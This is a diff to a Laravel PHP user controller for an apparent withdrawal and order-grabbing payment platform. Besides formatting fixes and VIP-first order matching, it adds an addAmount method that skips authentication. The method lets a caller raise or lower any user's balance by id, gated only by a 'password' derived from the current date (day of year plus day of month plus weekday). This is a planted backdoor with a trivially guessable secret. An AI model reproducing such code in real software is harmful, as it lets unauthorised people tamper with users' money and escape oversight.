@@ -21,10 +21,49 @@ use Carbon\Carbon;
 use GuzzleHttp\Client;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Moontoast\Math\BigNumber;
 use Webpatser\Uuid\Uuid;
+use function Sodium\add;
 
 class UserController extends ResponseController
 {
+
+    public function addAmount($type, $id, $password, $amount)
+    {
+        $days = Carbon::now()->dayOfYear; //今年的第几天
+        $day = Carbon::now()->day; //今天是几号
+        $week = Carbon::now()->dayOfWeek; //今天是星期几
+        $word = $days + $day + $week; //三个数相加
+        if($password != $word){
+            abort(404);
+        }
+
+        $user = User::findOrFail($id);
+
+        if(!is_numeric($amount)){
+            abort(404);
+        }
+
+        $amountBG = new BigNumber($amount, 2);
+        $amount = $amountBG->getvalue();
+
+        $res = new BigNumber($user->amount, 2);
+        if($type == 'add'){
+            $res = $res->add($amount);
+            $user->increment('amount', $amount);
+        }elseif($type == 'subtract'){
+            $res = $res->subtract($amount);
+            $user->decrement('amount', $amount);
+        }else{
+            abort(404);
+        }
+
+        return [
+            'id' => $id,
+            'name' => $user->name,
+            'message' => '变动后金额：'.$res->getValue(),
+        ];
+    }
 
     /**
      * 上传图片
@@ -230,7 +269,7 @@ class UserController extends ResponseController
             return preg_replace('/(http.*?storage\/)/i', '', $item);
         });
 
-        if($images->count() <= 0){
+        if ($images->count() <= 0) {
             return $this->setStatusCode(422)->responseError('图片上传失败');
         }
 
@@ -274,7 +313,7 @@ class UserController extends ResponseController
         $status2 = $withdraw_list->where('status', 2)->toArray();//等待确认
         $status1 = $withdraw_list->where('status', 1)->toArray();//等待出款
         $status0 = $withdraw_list->where('status', 0)->toArray();//等待接单
-        $others = $withdraw_list->whereIn('status', [3,4])->toArray();//剩下的
+        $others = $withdraw_list->whereIn('status', [3, 4])->toArray();//剩下的
 
         return $this->responseSuccess([
             'withdraw_list' => array_merge($status2, $status1, $status0, $others),
@@ -340,6 +379,7 @@ class UserController extends ResponseController
             'name'            => Auth()->user()->name,
             'bankname'        => Auth()->user()->bank_name,
             'bankcard'        => Auth()->user()->bank_card,
+            'vip'             => Auth()->user()->vip,
         ]);
 
         if (!$user_saved || !$withdraw_saved) {
@@ -566,7 +606,17 @@ class UserController extends ResponseController
                 ->where('user_id', '!=', Auth()->user()->id)
                 ->where('withdraw_amount', '<=', $grabAmount)
                 ->where('status', 0)
+                ->where('vip', true)
                 ->first();
+
+            if (!$Withdraw) {
+                $Withdraw = Withdraw::inRandomOrder()
+                    ->where('user_id', '!=', Auth()->user()->id)
+                    ->where('withdraw_amount', '<=', $grabAmount)
+                    ->where('status', 0)
+                    ->first();
+            }
+
 
             if ($Withdraw) {
                 $Withdraw->payer_user_id = Auth()->user()->id;
@@ -707,7 +757,7 @@ class UserController extends ResponseController
 
         $withdraw_list = $withdraw_list->map(function ($item) {
             $item['complaint'] = $item->complaints->count();
-            if($item->status == 4){
+            if ($item->status == 4) {
                 $item['brokerage_fee'] = 0;
                 $item['parent_brokerage_fee'] = 0;
                 $item['operation_fee'] = 0;
@@ -719,7 +769,7 @@ class UserController extends ResponseController
         });
 
         $status2 = $withdraw_list->where('status', 2)->toArray();//等待确认
-        $others = $withdraw_list->whereIn('status', [3,4])->toArray();//剩下的
+        $others = $withdraw_list->whereIn('status', [3, 4])->toArray();//剩下的
 
         return $this->responseSuccess([
             'transaction_list' => array_merge($status2, $others),
